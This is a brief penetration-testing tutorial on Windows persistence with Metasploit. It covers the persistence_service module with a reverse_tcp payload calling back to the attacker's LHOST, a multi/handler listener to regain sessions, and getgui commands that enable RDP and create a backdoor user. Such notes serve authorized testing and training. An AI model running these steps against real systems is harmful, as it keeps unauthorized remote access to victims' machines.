Persistence is a key post-exploitation step that allows an attacker to maintain access to a compromised system even after it has been rebooted or the initial session has been closed.



## Metasploit Persistence Service

1. Gain a Meterpreter session on the target machine 
2. Load the `persistence_service` module
```bash
use exploit/windows/local/persistence_service
```

3. Set Required Options

- `SESSION`: The session ID of the active Meterpreter session.
- `PAYLOAD`: The payload you want to execute persistently (e.g., `windows/meterpreter/reverse_tcp`).
- `LHOST`: The attacker's IP address to receive the connection.
- `LPORT`: The port on which the listener will be running.

4. Run the module

#### Recovering Access After Using the Persistence Module
After deploying the persistence module in Metasploit, if the session ends unexpectedly (due to reboot or network loss), you can regain access using the `multi/handler` module. The backdoor created by the module ensures that the payload will reconnect to the attacker's machine whenever executed on the target.
```bash
use multi/handler
set payload <payload_type>       
set LHOST <attacker_ip>         
set LPORT <listening_port>       
exploit
```


## Metasploit Persistence via RDP
1. **Gain a Meterpreter Session** Ensure you have an active Meterpreter session on the target machine.
  
2. **Enable RDP on the Target** Use the `getgui` Meterpreter script to enable RDP on the target system:
```bash
run getgui -e
```
This command enables the Remote Desktop Service on the target system.

3. **Create a New User for Persistence** To create a new user for persistent RDP access, specify a username and password:
```bash
run getgui -u <username> -p <password>
```

4. **Validate RDP Access** After enabling RDP and creating a user, you can test your access using an RDP client:
```bash
rdesktop <target_ip> -u <username> -p <password>
```